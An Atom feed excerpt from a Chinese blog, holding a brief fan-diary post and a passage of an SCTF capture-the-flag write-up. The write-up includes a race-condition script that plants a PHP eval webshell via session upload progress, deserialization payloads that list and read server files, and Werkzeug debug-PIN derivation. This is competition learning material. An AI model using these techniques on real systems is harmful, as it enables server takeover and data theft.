    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="WP" scheme="https://1llustrious.github.io/tags/WP/"/>
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
    <category term="复现" scheme="https://1llustrious.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>发电日记(一)</title>
    <link href="https://1llustrious.github.io/2023/12/03/%E5%8F%91%E7%94%B5%E6%97%A5%E8%AE%B0-%E4%B8%80/"/>
    <id>https://1llustrious.github.io/2023/12/03/%E5%8F%91%E7%94%B5%E6%97%A5%E8%AE%B0-%E4%B8%80/</id>
    <published>2023-12-03T03:58:53.000Z</published>
    <updated>2023-12-03T23:55:10.546Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>受不了了，👴要发电！！！</p><p>最近👴在玩富婆妹的 FD, 你知道的，我玩这个 FD, 就是奔着龙闲天梨来的，有谁不喜欢这样的妹子呢，🥵🥵🥵🥵🥵🥵🥰🥰🥰</p><p>![1701575986674](./ 发电日记 - 一 / 1701575986674.png</p><p>看看这可爱的脸，太好康了！！！</p><p><img src="/2023/12/03/%E5%8F%91%E7%94%B5%E6%97%A5%E8%AE%B0-%E4%B8%80/1701576175071.png" alt="1701576175071"></p><p>s</p><p>这么天然呆的甜妹，试问谁不喜欢呢</p><p><img src="/2023/12/03/%E5%8F%91%E7%94%B5%E6%97%A5%E8%AE%B0-%E4%B8%80/1701577445433.png" alt="1701577445433"></p><p>awsl!!!</p><p>这种语气 daisukiiiiiiiiiiiiiiiiiiiiiii!!!</p><p>就要这种白给的.</p><p>------------------ 未完待续 -----------------</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="杂谈" scheme="https://1llustrious.github.io/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>sctf</title>
    <link href="https://1llustrious.github.io/2023/12/02/sctf/"/>
    <id>https://1llustrious.github.io/2023/12/02/sctf/</id>
    <published>2023-12-02T14:29:09.000Z</published>
    <updated>2023-12-02T14:32:45.834Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#%E7%AE%97pin%E7%A0%81">算 pin 码</a><ul><li><a href="#ctfshow801">ctfshow801</a></li><li><a href="#%E5%9B%9E%E5%88%B0%E9%A2%98%E7%9B%AE">回到题目</a></li><li><a href="#%E6%80%BB%E7%BB%93">总结</a></li></ul></li><li><a href="#hellojava">hellojava</a><ul><li><a href="#%E7%86%9F%E6%82%89jackson">熟悉 jackson</a></li><li><a href="#%E5%9B%9E%E5%88%B0%E9%A2%98%E7%9B%AE-1">回到题目</a></li><li><a href="#%E5%9D%91%E7%82%B9">坑点</a></li><li><a href="#aliyunbapassit">aliyunbapassit</a></li></ul></li><li><a href="#fumo_backdoor">FUMO_backdoor</a><ul><li><a href="#%E5%A4%8D%E5%88%B6flag">复制 flag</a></li><li><a href="#%E5%86%99session">写 session</a></li><li><a href="#%E8%AF%BBflag~">读 flag~</a></li></ul></li><li><a href="#monitor">Monitor</a><ul><li><a href="#import">import</a></li><li><a href="#check%E8%B7%AF%E7%94%B1">check 路由</a></li><li><a href="#flag%E8%B7%AF%E7%94%B1">flag 路由</a></li></ul></li><li><a href="#sycserver">SycServer</a><ul><li><a href="#readfile%E8%B7%AF%E7%94%B1">readfile 路由</a></li><li><a href="#file-unachive">file-unachive</a></li><li><a href="#admin%E8%B7%AF%E7%94%B1">admin 路由</a></li></ul></li><li><a href="#easychek1n">easyChek1n</a></li></ul><!-- tocstop --><p><a href="https://xz.aliyun.com/t/2553#toc-2">https://xz.aliyun.com/t/2553#toc-2</a></p><p>ppy<br> 传 session，条件竞争才能跑出来。<br>直接网上搜一个双线程改一下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"># <span class="keyword">import</span> io</span><br><span class="line"># <span class="keyword">import</span> <span class="type">threading</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://192.168.229.132/include.php&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php $f = fopen(&#x27;3.php&#x27;,&#x27;w&#x27;);fwrite($f,&#x27;&lt;?php $cmd = 123;eval($_POST[$cmd]);?&gt;&#x27;);?&gt;&quot;</span>&#125;</span><br><span class="line">xiao = <span class="string">&quot;xiao&quot;</span></span><br><span class="line">files = &#123;<span class="string">&quot;1.jpg&quot;</span>: <span class="string">&quot;12323131231&quot;</span>&#125;</span><br><span class="line">cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: xiao&#125;</span><br><span class="line">session = requests.session()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def <span class="title function_">read</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        r = session.post(url, data=data, files=files, cookies=cookies)</span><br><span class="line">    print(r.text)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def <span class="title function_">write</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        new_url = url + <span class="string">&quot;?file=&quot;</span> + <span class="string">&quot;../Extensions/tmp/tmp/sess_&quot;</span> + <span class="type">xiao</span></span><br><span class="line">        <span class="variable">r1</span> <span class="operator">=</span> session.get(new_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;upload_progress_&quot;</span> in r.text:</span><br><span class="line">            print(<span class="string">&quot;上传成功&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    t1 = threading.Thread(target=read)</span><br><span class="line">    t2 = threading.Thread(target=write)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>此后只用在 read 改 data 即可，files 和 PHP_SESSION_UPLOAD_PROGRESS 别动。<br>先读个源码，返回个 html 代码，放入文件显示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="title function_">error_reporting</span><span class="params">(<span class="number">0</span>)</span>;</span><br><span class="line">    <span class="keyword">if</span>(!isset($_SESSION))&#123;</span><br><span class="line">        die(<span class="string">&#x27;Session not started&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    $type = $_SESSION[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $properties = $_SESSION[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line">    echo <span class="title function_">urlencode</span><span class="params">($_POST[<span class="string">&#x27;data&#x27;</span>])</span>;</span><br><span class="line">    extract(unserialize($_POST[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(is_string($properties)&amp;&amp;unserialize(urldecode($properties)))&#123;</span><br><span class="line">    $object = unserialize(urldecode($properties));</span><br><span class="line">    $object -&gt; sctf();</span><br><span class="line">    exit();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(is_array($properties))&#123;</span><br><span class="line">        $object = <span class="keyword">new</span> <span class="title class_">$type</span>($properties[<span class="number">0</span>],$properties[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $object = file_get_contents(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span>.$properties);</span><br><span class="line">    &#125;</span><br><span class="line">    echo <span class="string">&quot;this is the object: $object &lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>只需要传入 data 数组就可以实现 type 和 properties 的变量覆盖了。<br>找 flag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="type">php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> <span class="operator">=</span> array(</span><br><span class="line">    <span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;GlobIterator&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;properties&#x27;</span> =&gt; array(<span class="string">&quot;/*flag*&quot;</span>,<span class="string">&quot;1&quot;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">$serialized_data = serialize($data);</span><br><span class="line">$a=unserialize($serialized_data);</span><br><span class="line">var_dump($a);</span><br><span class="line">echo $serialized_data;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"># <span class="keyword">import</span> io</span><br><span class="line"># <span class="keyword">import</span> <span class="type">threading</span></span><br><span class="line"></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://115.239.215.75:8081/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;22&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;a:2:&#123;s:4:&quot;type&quot;;s:12:&quot;GlobIterator&quot;;s:10:&quot;properties&quot;;a:2:&#123;i:0;s:7:&quot;/*flag*&quot;;i:1;s:1:&quot;1&quot;;&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">xiao = <span class="string">&quot;xiao&quot;</span></span><br><span class="line">files = &#123;<span class="string">&quot;1.jpg&quot;</span>: <span class="string">&quot;12323131231&quot;</span>&#125;</span><br><span class="line">cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: xiao&#125;</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">read</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        res = session.post(url, data=data,files=files, cookies=cookies)</span><br><span class="line">        print(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">write</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        new_url = url + <span class="string">&quot;?file=&quot;</span> + <span class="string">&quot;../Extensions/tmp/tmp/sess_&quot;</span> + <span class="type">xiao</span></span><br><span class="line">        <span class="variable">r</span> <span class="operator">=</span> session.get(new_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;upload_progress_&quot;</span> in r.text:</span><br><span class="line">            print(r.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    t1 = threading.Thread(target=read)</span><br><span class="line">    t2 = threading.Thread(target=write)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag 在 /flag<br><a href="http://xn--app-v96f885g.py"> 提示 app.py</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="type">php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> <span class="operator">=</span> array(</span><br><span class="line">    <span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;GlobIterator&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;properties&#x27;</span> =&gt; array(<span class="string">&quot;/usr/lib/python3.8/site-packages/flask/app*&quot;</span>,<span class="string">&quot;0&quot;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">$serialized_data = serialize($data);</span><br><span class="line">$a=unserialize($serialized_data);</span><br><span class="line">var_dump($a);</span><br><span class="line">echo $serialized_data;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="type">php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> <span class="operator">=</span> array(</span><br><span class="line">    <span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;SplFileObject&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;properties&#x27;</span> =&gt; array(<span class="string">&quot;php://filter/convert.base64-encode/resource=/usr/lib/python3.8/site-packages/flask/app.py&quot;</span>,<span class="string">&quot;r&quot;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">$serialized_data = serialize($data);</span><br><span class="line">$a=unserialize($serialized_data);</span><br><span class="line">var_dump($a);</span><br><span class="line">echo $serialized_data;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2000 行代码，恐怖如斯。</p><h1 id="算-pin-码"><span id="算-pin-码"> 算 pin 码</span></h1><p>werkzurg/debug/init.py<br> 听师傅说这道题有算 pin 码的操作，趁着这个机会，把算 pin 先学一下。<br>简而言之，就是 flask 开启了 debug 模式，会生成一个密码，使用这个密码就能任意代码执行了。<br>而这个生成 pin 码也有个流程，可以在 pycahrm 的源码分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">pin</span><span class="params">(self)</span> -&gt; t.Optional[str]:</span><br><span class="line">       <span class="keyword">if</span> not <span class="title function_">hasattr</span><span class="params">(self, <span class="string">&quot;_pin&quot;</span>)</span>:</span><br><span class="line">           pin_cookie = get_pin_and_cookie_name(self.app)</span><br><span class="line">           self._pin, self._pin_cookie = pin_cookie  # type: ignore</span><br><span class="line">       <span class="keyword">return</span> self._pin</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">get_pin_and_cookie_name</span><span class="params">(</span></span><br><span class="line"><span class="params">    app: <span class="string">&quot;WSGIApplication&quot;</span>,</span></span><br><span class="line"><span class="params">)</span> -&gt; t.Union[t.Tuple[str, str], t.Tuple[None, None]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pin = os.environ.get(<span class="string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)</span><br><span class="line">    rv = <span class="type">None</span></span><br><span class="line">    <span class="variable">num</span> <span class="operator">=</span> None</span><br><span class="line"></span><br><span class="line">    # Pin was explicitly disabled</span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">&quot;off&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> None, None</span><br><span class="line"></span><br><span class="line">    # Pin was provided explicitly</span><br><span class="line">    <span class="keyword">if</span> pin is not None and pin.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).isdecimal():</span><br><span class="line">        # If there are separators in the pin, <span class="keyword">return</span> it directly</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;-&quot;</span> in pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = <span class="type">pin</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">modname</span> <span class="operator">=</span> getattr(app, <span class="string">&quot;__module__&quot;</span>, t.cast(object, app).__class__.__module__)</span><br><span class="line">    username: t.Optional[str]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        # getuser imports the pwd <span class="keyword">module</span>, which does not exist in Google</span><br><span class="line">        # App Engine. It may also raise a KeyError <span class="keyword">if</span> the UID does not</span><br><span class="line">        # have a username, such as in Docker.</span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    except (ImportError, KeyError):</span><br><span class="line">        username = <span class="type">None</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">mod</span> <span class="operator">=</span> sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">    # This information only exists to make the cookie unique on the</span><br><span class="line">    # computer, not as a security feature.</span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        getattr(app, <span class="string">&quot;__name__&quot;</span>, type(app).__name__),</span><br><span class="line">        getattr(mod, <span class="string">&quot;__file__&quot;</span>, None),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    # This information is here to make it harder <span class="keyword">for</span> an attacker to</span><br><span class="line">    # guess the cookie name.  They are unlikely to be contained anywhere</span><br><span class="line">    # within the unauthenticated debug page.</span><br><span class="line">    private_bits = [str(uuid.getnode()), get_machine_id()]</span><br><span class="line"></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit in <span class="title function_">chain</span><span class="params">(probably_public_bits, private_bits)</span>:</span><br><span class="line">        <span class="keyword">if</span> not bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">isinstance</span><span class="params">(bit, str)</span>:</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(b<span class="string">&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = f<span class="string">&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    # If we need to generate a pin we salt it a bit more so that we don<span class="string">&#x27;t</span></span><br><span class="line"><span class="string">    # end up with the same value and generate out 9 digits</span></span><br><span class="line"><span class="string">    if num is None:</span></span><br><span class="line"><span class="string">        h.update(b&quot;pinsalt&quot;)</span></span><br><span class="line"><span class="string">        num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="string">    # we don&#x27;</span>t have a result yet.</span><br><span class="line">    <span class="keyword">if</span> rv is None:</span><br><span class="line">        <span class="keyword">for</span> group_size in <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="title function_">len</span><span class="params">(num)</span> % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, len(num)</span>, group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure><p>rv 就是 pin 码<br>重点看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> bit in <span class="title function_">chain</span><span class="params">(probably_public_bits, private_bits)</span>:</span><br><span class="line">    <span class="keyword">if</span> not bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">isinstance</span><span class="params">(bit, str)</span>:</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b<span class="string">&quot;cookiesalt&quot;</span>)</span><br></pre></td></tr></table></figure><p>引入了两张表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        getattr(app, <span class="string">&quot;__name__&quot;</span>, type(app).__name__),</span><br><span class="line">        getattr(mod, <span class="string">&quot;__file__&quot;</span>, None),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private_bits = [str(uuid.getnode()), get_machine_id()]</span><br></pre></td></tr></table></figure><p>结合 debug 的变量信息做分析<br> username 就是启动 flask 的用户。<br>modnane 一般为 flask.app<br>getattr(app, ‘<strong>name</strong>’, getattr(app.<strong>class</strong>, ‘<strong>name</strong>’)) 为 Flask.<br>getattr(mod, ‘<strong>file</strong>’, None) 为 flask 目录下的一个 app.py 的绝对路径.<br>uuid.getnode () 就是当前电脑的 MAC 地址，str (uuid.getnode ()) 则是 mac 地址的十进制表达式。<br>getmachine_id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_machine_id</span>() -&gt; t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]]:</span><br><span class="line">    <span class="keyword">global</span> _machine_id</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _machine_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> _machine_id</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">_generate</span>() -&gt; t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]]:</span><br><span class="line">            linux = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># machine-id is stable across boots, boot_id is not.</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span 